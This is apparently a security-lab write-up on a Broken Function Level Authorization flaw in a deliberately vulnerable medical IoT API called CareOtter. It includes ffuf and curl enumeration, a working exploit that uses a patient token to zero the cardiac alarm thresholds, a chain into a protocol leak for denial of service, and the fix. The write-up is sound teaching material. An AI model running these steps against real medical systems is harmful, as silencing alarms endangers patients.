---
id: API5:2023
title: Broken Function Level Authorization (BFLA)
category: API
status: DONE
severity: High
owasp: API5 — Broken Function Level Authorization
cwe: CWE-863 (Incorrect Authorization) / CWE-285
source_docs:
  - CareOtter_Test_Suite.md §API-06
  - "CareOtter_API.md Vulnerability Surface #8"
affected_components:
  - cloud_api/careotter/api_server/core/decorators.py
  - cloud_api/careotter/api_server/app.py
verified_date: 2026-05-02
---

# API5 — Broken Function Level Authorization (BFLA)

> **Source docs:** `CareOtter_Test_Suite.md` §API-05, `CareOtter_API.md` Vulnerability Surface #8  
> **OWASP:** API5 — Broken Function Level Authorization  
> **CWE:** CWE-863 (Incorrect Authorization) / CWE-285  
> **Severity:** High

---

## Why It Matters

Authentication answers the question *"Who are you?"* Authorization answers *"What are you allowed to do?"* CareOtter conflates the two. Once the Cloud API verifies that a JWT is cryptographically valid (correct signature, not expired), it assumes the bearer is authorized to invoke **any** protected REST endpoint. The `role` claim inside the token (`admin` vs `patient`) is never inspected for API routes, even though the same application enforces role separation perfectly in its HTML routes.

This is a classic **Broken Function Level Authorization (BFLA)** vulnerability: a low-privilege user (patient) can exercise high-privilege functions (administrative device management) with nothing more than their own legitimate credentials.

In this lab the live BFLA has been **narrowed to a single endpoint** — `POST /api/config/thresholds` — while the remaining administrative routes (`/api/network`, `/api/network/wifi`, `/api/config/preferences`, `/api/services/restart`, `/api/logs`) were corrected to `@admin_required` and now reject a patient token with `403 Forbidden`. The exposure is still clinically serious: with nothing but their own credentials a patient can rewrite the cardiac alert thresholds (`bpm_min=0`, `spo2_min=0`), silencing every alarm on the bedside monitor — and the same response leaks the IGP request frame, chaining into the API4 denial-of-service (see Step 4).

---

## Root Cause

The defect is architectural: the REST API and the Web UI use two completely different authorization decorators.

### 1. REST API decorator (`core/decorators.py`)

```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return jsonify({'error': 'Token required', 'code': 'MISSING_TOKEN'}), 401

        token = auth_header.split(' ', 1)[1].strip()
        result = JWTService.decode_token(token)

        if not result['success']:
            return jsonify({'error': result['error'], 'code': 'INVALID_TOKEN'}), 401

        # MISSING: no inspection of result['payload']['role']
        return f(*args, **kwargs)
    return decorated
```

`@token_required` performs **authentication only**. It validates the JWT signature and expiration, then immediately calls the handler. It never reads the `role` claim from the decoded payload.

### 2. Web UI decorator (`core/decorators.py`)

```python
def web_admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated
```

`@web_admin_required` performs **both authentication and authorization**. It extracts the payload and explicitly checks `role == 'admin'`. The HTML routes (`/admin/dashboard`, `/admin/network`, etc.) are therefore properly protected.

### 3. The gap

The  `threshold` administrative REST endpoint in `app.py` uses `@token_required`, not `@web_admin_required`:

- `POST /api/config/thresholds`

Because the REST layer lacks role enforcement, any user who can obtain a valid JWT — including a patient — can invoke this endpoint.

---

## Affected Endpoints

| Method | Endpoint                  | Admin Function                | Impact When Accessed by Patient                                       |
| ------ | ------------------------- | ----------------------------- | --------------------------------------------------------------------- |
| `POST` | `/api/config/thresholds`  | Set clinical alert thresholds | **Patient safety** — BPM/spO₂ alarms silenced (bpm_min=0, spo2_min=0) |


---

## Discovery / Enumeration

Before exploiting the BFLA the attacker has to find **which** of the API's ~40 routes is the mis-authorized one. In this lab that endpoint is **not leaked to the patient client** — it is absent from the patient/caregiver static JS (`panel.js`, `caregiver_dashboard.js`…), the mobile app sets thresholds over **IGP** (`IgpClient.setThreshold`, port 9999) rather than the cloud route, and there is no Swagger/OpenAPI spec. Discovery is therefore **active enumeration**, not passive reading.

### 1. Enumerate the endpoint surface

**Content discovery (fuzzing).** Authenticated with their own patient JWT, the attacker fuzzes paths and reads the **status code as an authorization map**:

```bash
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"johnny123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

ffuf -u http://localhost:5002/api/config/FUZZ -w params.txt -X POST \
  -H "Authorization: Bearer $JWT_PATIENT" -H "Content-Type: application/json" \
  -d '{}' -mc all -fc 404
# thresholds → 200   ·   preferences → 403
```

| Code (with a patient JWT) | Meaning |
| ------------------------- | ------- |
| `404` | endpoint does not exist |
| `401` | exists, no/invalid auth |
| `403` | exists but requires **admin role** (`@admin_required`) — a protected admin endpoint |
| `405` | wrong HTTP method — the `Allow:` response header reveals the valid verbs |
| `200`/`2xx` | exists and the **patient is allowed** to call it |

**Client / convention inference.** The mobile app's `IgpClient` exposes the device command taxonomy (`CMD_SET_THRESHOLD 0x08`, `CMD_GET_NETWORK 0x03`, `CMD_SET_WIFI 0x06`…); the Cloud API mirrors these as `/api/config/thresholds`, `/api/network`, `/api/network/wifi`, so the admin route names are guessable even though the app drives them over IGP. The admin web templates (`config.html`, `network.html`, `logs.html`) also embed these paths in inline JS — reachable if the attacker obtains that source (LFI, a static-route misconfig, or the lab material itself).

### 2. Identify which endpoints are BFLA-vulnerable (role differential)

With the surface mapped, replay every administrative endpoint **with the correct HTTP method** and the **low-privilege patient JWT**, flagging any admin function that answers `2xx` instead of `403`:

```bash
while read method ep; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X "$method" \
         -H "Authorization: Bearer $JWT_PATIENT" -H "Content-Type: application/json" \
         -d '{}' "http://localhost:5002$ep")
  echo "$code  $method $ep"
done <<'EOF'
GET  /api/network
POST /api/config/preferences
POST /api/config/thresholds
POST /api/services/restart
GET  /api/logs
EOF
# 403  GET  /api/network             ← admin_required (protected)
# 403  POST /api/config/preferences  ← admin_required (protected)
# 200  POST /api/config/thresholds   ← token_required  ★ BFLA
# 403  POST /api/services/restart    ← admin_required (protected)
# 403  GET  /api/logs                ← admin_required (protected)
```

> Use the **right verb** per route: a `POST` to a `GET`-only endpoint returns `405`, not `403`, which would muddy the differential.

The **authorization oracle** for "what *should* be admin-only" is the Web UI: the `/admin/*` routes redirect a patient to login (the web layer enforces the role), so any REST counterpart a patient can still reach is mis-authorized. Generalised, build a **role × endpoint matrix** (patient / caregiver / admin); every cell where a low role reaches a high-role function is a BFLA. Here the matrix has exactly **one** offending cell: `POST /api/config/thresholds`.

---

## Steps to Reproduce

**Precondition:** The system must be initialized (users exist). If the database is empty, run:

```bash
curl http://localhost:5002/initialize_iot
```

### Step 1 — Obtain a valid patient JWT

```bash
JWT_PATIENT=$(curl -s -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username":"john_doe","password":"johnny123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$JWT_PATIENT"
```

You can dinamically obtain the JWT Token by login in the cloud's login panel:
![[api-06-login-patient.png]]
Cloud starts showing some hints as "type" field with value "Bearer".  JWT Token is really located on browser's cookies.
![[Pasted image 20260515114444.png]]
### Step 2 — Inspect the token payload to confirm `role: patient`

```bash
echo -n "$JWT_PATIENT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Expected output:
```json
{
  "username": "patient",
  "role": "patient",
  "exp": 1750000000,
  "iat": 1749996400
}
```

### Step 3 — Exploit the BFLA: modify clinical thresholds with a patient token

`POST /api/config/thresholds` is the one administrative endpoint still guarded by `@token_required` (authentication only), so the patient token is accepted and the clinical alert thresholds are overwritten — `bpm_min=0`, `bpm_max=255`, `spo2_min=0` silences every BPM/SpO₂ alarm on the bedside monitor:

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":0,"bpm_max":255,"spo2_min":0}' \
  http://localhost:5002/api/config/thresholds
```

> **The other admin endpoints are now properly authorized.** `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart` and `GET /api/logs` were narrowed to `@admin_required` and return **`403 Forbidden`** to a patient token. That 200-vs-403 split is exactly what the **Discovery / Enumeration** differential above surfaces — only `/api/config/thresholds` is the live BFLA.

### Step 4 — Chain: leak the IGP MAGIC, then enable the API4 DoS

In **vulnerable mode** the same threshold call additionally returns the raw IGP
request frame the Cloud API sent to the device, in the `igp_request` field:

```bash
curl -s -X POST -H "Authorization: Bearer $JWT_PATIENT" \
  -H "Content-Type: application/json" \
  -d '{"bpm_min":50,"bpm_max":120,"spo2_min":90}' \
  http://localhost:5002/api/config/thresholds | jq -r .igp_request
# 4341524508000009bb0400320078cc015a
python3 -c "print(bytes.fromhex('4341524508000009bb0400320078cc015a')[:4])"
# b'CARE'   ← the IGP protocol MAGIC (0x43415245)
```

![[api5_chain_api4_hex_string.png]]
The first 4 bytes decode to the protocol **MAGIC `0x43415245` ("CARE")**, followed by
the `0x08` command framing. A patient who reached this admin endpoint via the BFLA now
knows how to build *valid* IGP frames — the prerequisite for the
[API4 Unrestricted Resource Consumption](API4_Unrestricted_Resource_Consumption.md)
connection flood of `:9999`. In secure mode (`VULNERABLE=0`) the `igp_request` field is
omitted (same strip as the `GET_NETWORK` `raw` field).

![[api5_cyberchef_magic_number.png]]

> **Chain:** API5 (BFLA reaches `set_thresholds`) → information disclosure of the IGP
> request frame → API4 (valid-frame flood of the careservice command channel).

---

## Expected Result

`POST /api/config/thresholds` returns `200 OK` with a patient token instead of `403 Forbidden`. The token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates the `role` claim**. The response is `THRESHOLDS_UPDATED` with BPM range `0–255` and SpO₂ minimum `0`, effectively disabling all clinical alerts; in vulnerable mode it also carries the `igp_request` field (Step 4).

The remaining administrative endpoints behave as the secure baseline — a patient token receives **`403 Forbidden`**:
- `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart`, `GET /api/logs` → `403` (`@admin_required`).

That single `200` among `403`s is the BFLA signature the role differential in *Discovery / Enumeration* pinpoints.

---

## How It Should Be

The REST layer should enforce role-based access control with the same rigor as the Web UI layer. The minimal fix is to introduce an `@admin_required` decorator for REST endpoints and apply it to all administrative functions:

```python
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'admin':
            return jsonify({
                'error': 'Admin access required',
                'code': 'FORBIDDEN'
            }), 403
        return f(*args, **kwargs)
    return decorated
```

This `@admin_required` guard has **already been applied to every administrative REST route except** `POST /api/config/thresholds`, which is intentionally left on `@token_required` as the lab's BFLA. The remaining fix is therefore to guard the last one:
- `POST /api/config/thresholds` → switch `@token_required` to `@admin_required`

Already corrected (they return `403` to a patient today): `GET /api/network`, `POST /api/network/wifi`, `POST /api/config/preferences`, `POST /api/services/restart`, `GET /api/logs`.

Endpoints that are legitimately accessible to both roles (e.g., `GET /api/vitals`, `GET /api/vitals/history`) can continue using `@token_required`, but should ideally use `@role_required('admin', 'patient')` for explicitness.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authorization | Role-enforcing decorator on every admin REST endpoint | Prevent patients from invoking admin functions |
| Authorization | Deny-by-default — return `403` if role is missing or unexpected | Fail closed rather than fail open |
| Audit | Log every API call with `username`, `role`, `endpoint`, and `source_ip` | Enable forensic tracing of unauthorized access attempts |
| Testing | Automated BFLA test suite — patient JWT against every admin endpoint | Detect regressions where `@token_required` replaces `@admin_required` |

---

## Verification Checklist

- [ ] Patient JWT successfully authenticates at `/api/auth/login/patient`
- [ ] Patient JWT payload contains `"role": "patient"`
- [ ] **Discovery:** fuzzing `/api/config/FUZZ` with the patient JWT returns `200` for `thresholds` and `403` for `preferences`
- [ ] **Differential:** the role-replay loop shows exactly one `200` (`POST /api/config/thresholds`) among `403`s for the other admin endpoints
- [ ] `POST /api/config/thresholds` with patient JWT returns `200 OK` (not `403`) and sets `bpm_min=0` / `spo2_min=0`
- [ ] Negative control: `GET /api/network`, `POST /api/services/restart`, `POST /api/network/wifi` with patient JWT all return `403`
- [ ] Web UI `/admin/dashboard` with patient cookie redirects to login (confirms UI layer is protected)

---

## References

- `CareOtter_Test_Suite.md` §API-06
- `CareOtter_API.md` Vulnerability Surface #8
- Chains to `API4_UNrestricted_Resource_Consumption.md` — the leaked MAGIC enables valid IGP frames
